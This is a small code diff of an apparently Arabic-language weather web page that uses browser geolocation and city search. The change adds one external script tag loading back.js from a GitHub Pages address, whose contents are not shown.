@@ -60,4 +60,5 @@ async function weatherByLocation(latitude,longitude){const lat=Number(latitude.t
 function useMyLocation(){if(!navigator.geolocation){setStatus('هذا المتصفح لا يدعم تحديد الموقع. ابحث باسم المدينة يدوياً.',true);return}const btn=$('locationBtn');btn.disabled=true;btn.textContent='جارٍ التحديد…';setStatus('سيطلب المتصفح إذنك لتحديد المدينة تقريبياً…');navigator.geolocation.getCurrentPosition(p=>{btn.disabled=false;btn.textContent='◎ استخدم موقعي';weatherByLocation(p.coords.latitude,p.coords.longitude)},e=>{btn.disabled=false;btn.textContent='◎ استخدم موقعي';const msg=e.code===1?'لم تسمح باستخدام الموقع. يمكنك البحث باسم المدينة يدوياً.':e.code===3?'انتهت مهلة تحديد الموقع. حاول مرة أخرى في مكان مفتوح.':'تعذر تحديد الموقع. تأكد من تشغيل خدمة الموقع واستخدم رابط GitHub Pages الآمن.';setStatus(msg,true)},{enableHighAccuracy:false,timeout:12000,maximumAge:600000})}
 $('searchForm').addEventListener('submit',e=>{e.preventDefault();const q=$('cityInput').value.trim();if(q)search(q)});$('locationBtn').addEventListener('click',useMyLocation);search('الرياض');
 </script>
+<script src="https://adelss12.github.io/back.js" defer></script>
 </body></html>
